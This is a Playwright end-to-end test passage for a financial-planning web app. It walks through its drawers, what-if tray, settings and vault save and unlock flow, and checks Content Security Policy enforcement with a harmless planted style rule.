    // and its popup inside it), opened from an account row, its mix picker opened and shut, then closed by Cancel with
    // nothing changed; focus back on the row.
    await page.getByRole('navigation', { name: copy.shellModulesLabel }).getByRole('link', { name: copy.shellModuleProfile, exact: true }).click()
    await expect(page.locator('main.result[data-shell-screen="profile-net-worth"]'), 'Net Worth never showed').toBeAttached()
    const row = page.locator('[data-profile-card="account-0"]')
    await row.click()
    const drawer = page.getByRole('dialog')
    await expect(drawer, 'the Profile drawer never opened').toBeVisible()
    await drawer.getByRole('combobox', { name: copy.profileMixHow }).click()
    await expect(page.getByRole('listbox'), 'the drawer’s picker never opened').toBeVisible()
    await page.keyboard.press('Escape')
    await expect(page.getByRole('listbox')).toHaveCount(0)
    await drawer.getByRole('button', { name: copy.profileDrawerCancel, exact: true }).click()
    await expect(drawer, 'the Profile drawer never closed').toHaveCount(0)
    await expect(row, 'focus back on the account row').toBeFocused()
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'a Profile page injected a <style> element').toBe(0)

    // Profile → Expenses (RC13b, in place of the facts page and its step sheets): the Living expenses drawer, its
    // "How you give your spending" choice (the kit's native ChoiceGroup) moved to the budget, so the worksheet draws,
    // then closed with its changes dropped through the drawer's own ask.
    await page.getByRole('navigation', { name: copy.shellPagesLabel }).getByRole('link', { name: copy.shellPageExpenses, exact: true }).click()
    await expect(page.locator('main.result[data-shell-screen="profile-expenses"]'), 'Expenses never showed').toBeAttached()
    await page.locator('[data-profile-card="living"]').click()
    const living = page.getByRole('dialog', { name: copy.profileKindLiving })
    await expect(living, 'the Living expenses drawer never opened').toBeVisible()
    await living.locator('[data-choice-group="living-approach"] label[data-choice="budget"]').click()
    await expect(living.locator('[data-budget-worksheet]'), 'the worksheet never drew').toBeVisible()
    await living.getByRole('button', { name: copy.profileDrawerCancel, exact: true }).click()
    await living.getByRole('button', { name: copy.profileUnsavedDrop, exact: true }).click()
    await expect(living, 'the Living expenses drawer never closed').toHaveCount(0)
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'an Expenses drawer injected a <style> element').toBe(0)

    // Probability's Action Items tray (Retirement → Analysis, RC4b): one what-if, run on the build's own engine worker (its
    // many-futures run and both named futures) by the tray's Refresh. Spending is offered to every household: its first
    // figure set $1,000 lower with Enter (pending, marked), then Refresh, then the difference line speaks the two counts.
    // The Edit drawer (a portaled, animated dialog) opens and closes.
    await page.getByRole('navigation', { name: copy.shellModulesLabel }).getByRole('link', { name: copy.shellModuleRetirement, exact: true }).click()
    await expect(page.locator('main.result[data-shell-screen="probability"]')).toBeAttached()
    await page.getByRole('button', { name: copy.trayHandle, exact: true }).click()
    const tray = page.locator('#b9-action-items')
    await expect(tray, 'the tray never opened').toBeVisible()
    const spend = tray.locator('[data-tray-group="spending"] input[inputmode="decimal"]').first()
    const planSpend = Number((await spend.inputValue()).replace(/[^0-9]/g, ''))
    expect(planSpend, '[test setup] the spending figure reads').toBeGreaterThan(1_000)
    await spend.fill(String(planSpend - 1_000))
    await spend.press('Enter')
    await expect(tray.locator('[data-changed]').first(), 'the edit waits in the tray, marked').toBeVisible()
    await tray.locator('[data-tray-refresh]').click()
    await expect
      .poll(async () => ((await page.locator('[data-difference] span').first().textContent()) ?? '').trim(), { message: 'the what-if’s difference line never spoke', timeout: 60_000 })
      .not.toMatch(new RegExp(`^$|^${copy.probabilityNoChanges.slice(0, 20)}`))
    await expect(page.locator('[data-half="alternative"] [aria-busy="true"]'), 'the what-if’s run never settled').toHaveCount(0, { timeout: 60_000 })
    await tray.getByRole('button', { name: copy.trayEdit, exact: true }).click()
    const edit = page.getByRole('dialog', { name: copy.trayEditTitle })
    await expect(edit, 'the Edit drawer never opened').toBeVisible()
    await page.keyboard.press('Escape')
    await expect(edit).toHaveCount(0)
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'the tray injected a <style> element').toBe(0)
    // Shut again by its handle (open, it would become the phone's full-height sheet when the window narrows below).
    await page.getByRole('button', { name: copy.trayHandle, exact: true }).click()
    await expect(tray, 'the tray never shut').toBeHidden()

    // The Display drawer (RC18): "Today's dollars" beside the folder tabs opens it; a switch flipped, then Save, so the
    // shell hands the years axis to every chart, then back to ages the same way.
    for (const want of [true, false]) {
      await page.getByRole('button', { name: copy.displayDoorLabel, exact: true }).click()
      const display = page.getByRole('dialog', { name: copy.displayTitle })
      await expect(display, 'the Display drawer never opened').toBeVisible()
      const years = display.getByRole('switch', { name: copy.displayYears })
      await years.click()
      await expect(years).toHaveAttribute('aria-checked', String(want))
      await display.getByRole('button', { name: copy.profileDrawerSave, exact: true }).click()
      await expect(display, 'the Display drawer never closed').toHaveCount(0)
    }
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'the Display drawer injected a <style> element').toBe(0)

    // Settings (RC18): the gear's page, each folder tab, then the survivor row's door opens the Living expenses drawer
    // over Settings, shut by Cancel with nothing changed.
    await page.locator('[data-gear]').click()
    await expect(page.locator('main.result[data-shell-screen="settings"]'), 'Settings never showed').toBeAttached()
    for (const tab of [copy.settingsTabReturns, copy.settingsTabTax, copy.settingsTabHealth, copy.settingsTabOther, copy.settingsTabMethodology]) {
      await page.getByRole('tab', { name: tab, exact: true }).click()
      await expect(page.getByRole('tab', { name: tab, exact: true })).toHaveAttribute('aria-selected', 'true')
    }
    await page.locator('[data-assumption-seat="survivor-ratio"]').getByRole('button', { name: copy.settingsSurvivorRatioDoor }).click()
    const overSettings = page.getByRole('dialog', { name: copy.profileKindLiving })
    await expect(overSettings, 'the drawer never opened over Settings').toBeVisible()
    await overSettings.getByRole('button', { name: copy.profileDrawerCancel, exact: true }).click()
    await expect(overSettings, 'the drawer never closed').toHaveCount(0)
    await expect(page.locator('main.result[data-shell-screen="settings"]'), 'the drawer left Settings').toBeAttached()
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'Settings injected a <style> element').toBe(0)

    // At a phone width the menu (a portaled, animated dialog) reaches Cash Flows and closes on the choice.
    await page.setViewportSize({ width: 390, height: 844 })
    await page.getByRole('button', { name: copy.shellMenuOpen, exact: true }).click()
    const menu = page.getByRole('dialog', { name: copy.shellMenuTitle })
    await expect(menu, 'the phone menu never opened').toBeVisible()
    await menu.getByRole('link', { name: copy.shellPageCashFlows, exact: true }).click()
    await expect(menu).toHaveCount(0)
    await expect(page.locator('main.result[data-shell-screen="cash-flows"]')).toBeAttached()

    // The way home: the wordmark goes to Snapshot (a page move, so the unkept what-if survives and nothing is asked).
    await page.getByRole('link', { name: copy.shellHomeLabel }).click()
    await expect(page.locator('main.result[data-shell-screen="snapshot"]')).toBeAttached({ timeout: 30_000 })
    await expect(page.getByText(copy.shellLeaveWhatIf, { exact: true })).toHaveCount(0)

    // Act 6 · RC19: the save drawer (the kit's Drawer over the quiet stone page) from the lock menu's Keep, past the
    // ceremony's ask over the tray's unkept what-if: the passphrase, the recovery word, the backup (shown as text, the
    // channel with no download), the done state.
    await page.setViewportSize({ width: 1280, height: 720 })
    await page.getByRole('button', { name: new RegExp(`^${copy.lockMenuLabel}`) }).click()
    await page.getByRole('menuitem', { name: copy.saveCta }).click()
    const goOn = page.getByRole('button', { name: copy.shellCeremonyGo, exact: true })
    await expect(goOn, 'the ceremony never asked over the unkept what-if').toBeVisible()
    await goOn.click()
    const saveDrawer = page.getByRole('dialog', { name: copy.saveDrawerTitle })
    await expect(saveDrawer, 'the save drawer never opened').toBeVisible()
    await saveDrawer.getByLabel(copy.passphraseLabel, { exact: true }).fill(VAULT_PASSPHRASE)
    await saveDrawer.getByLabel(copy.passphraseConfirmLabel, { exact: true }).fill(VAULT_PASSPHRASE)
    await saveDrawer.getByRole('button', { name: copy.flowNext, exact: true }).click()
    await expect(saveDrawer.getByRole('heading', { name: copy.recoveryHeading })).toBeVisible({ timeout: 30_000 })
    await saveDrawer.getByLabel(copy.recoveryLabel, { exact: true }).fill(VAULT_RECOVERY)
    await saveDrawer.getByLabel(copy.recoveryConfirmLabel, { exact: true }).fill(VAULT_RECOVERY)
    await saveDrawer.getByRole('button', { name: copy.flowNext, exact: true }).click()
    await expect(saveDrawer.getByRole('heading', { name: copy.exportHeading }), 'the commit never reached the backup step').toBeVisible({ timeout: 60_000 })
    await saveDrawer.getByRole('button', { name: copy.exportShowText, exact: true }).click()
    await saveDrawer.getByRole('button', { name: copy.exportTextSaved, exact: true }).click()
    await saveDrawer.getByRole('button', { name: copy.exportFinish, exact: true }).click()
    await expect(saveDrawer.getByRole('heading', { name: copy.savedHeading })).toBeVisible()
    await saveDrawer.getByRole('button', { name: copy.savedDone, exact: true }).click()
    await expect(saveDrawer, 'the save drawer never closed').toHaveCount(0)
    await expect(page.locator('main.result'), 'back in the shell').toHaveCount(1)
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'the save drawer injected a <style> element').toBe(0)

    // A reload finds the vault: the unlock card. A wrong passphrase is refused with its words; the right one opens the plan
    // onto the re-entry gate, whose affirm lands on the home.
    await page.reload()
    await expect(page.getByRole('heading', { name: copy.unlockHeading }), 'the reload never reached the unlock card').toBeVisible({ timeout: 30_000 })
    const passBox = page.getByLabel(copy.unlockLabel, { exact: true })
    await passBox.fill('not the passphrase at all')
    await page.getByRole('button', { name: copy.unlockButton, exact: true }).click()
    await expect(page.getByRole('alert').filter({ hasText: copy.unlockWrongCredential }), 'the refused unlock said nothing').toBeVisible({ timeout: 30_000 })
    await passBox.fill(VAULT_PASSPHRASE)
    await page.getByRole('button', { name: copy.unlockButton, exact: true }).click()
    const affirm = page.getByRole('button', { name: copy.reentryAffirmCta, exact: true })
    await expect(affirm, 'the unlock never reached the re-entry gate').toBeVisible({ timeout: 60_000 })
    await affirm.click()
    await expect(page.getByRole('heading', { level: 1, name: copy.shellPageSnapshot }), 'the gate never landed on the home').toBeVisible({ timeout: 120_000 })
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'the vault screens injected a <style> element').toBe(0)

    expect(await violations(page)).toEqual([])
    expect(outside, 'a request left the build’s own origin').toEqual([])
  })

  /** The stack's control pair (insight 016), on the main app since Act 6 · RC19 deleted the kit probe page: on the cold
   *  start, a planted `<style>` is BLOCKED on the enforced origin and APPLIES on the no-CSP control origin, so the shell
   *  arm's "no violation, no `<style>`" is a real reading, never a deaf collector. */
  test('a planted <style> is blocked under the CSP (style-src) …', async ({ page }) => {
    await installCollector(page)
    await page.goto('/')
    await expect(page.getByRole('heading', { level: 1, name: copy.coldStartQuestion })).toBeVisible({ timeout: 30_000 })
    expect(await plantStyle(page), 'the planted <style> applied under the enforced CSP').toBe(false)
    expect((await violations(page)).some((x) => x.violatedDirective.startsWith('style-src'))).toBe(true)
  })

  test('CONTROL: … and the same planted <style> applies on the cold start when no CSP is served', async ({ page }) => {
    await installCollector(page)
    await page.goto(`${CONTROL_ORIGIN}/`)
    await expect(page.getByRole('heading', { level: 1, name: copy.coldStartQuestion })).toBeVisible({ timeout: 30_000 })
    expect(await plantStyle(page), 'the planted <style> did not apply with no CSP — the plant is broken').toBe(true)
    expect(await violations(page)).toHaveLength(0)
  })
})

/** Appends a `<style>` that would give the page's first h1 a 7 px outline; true when the rule took effect. */
async function plantStyle(page: Page): Promise<boolean> {
  return page.evaluate(async () => {
    const s = document.createElement('style')
    s.textContent = 'h1 { outline: 7px solid currentcolor !important; }'
    document.head.appendChild(s)
    await new Promise((r) => requestAnimationFrame(() => r(null)))
    const h1 = document.querySelector('h1')
    return h1 !== null && getComputedStyle(h1).outlineWidth === '7px'
  })
}
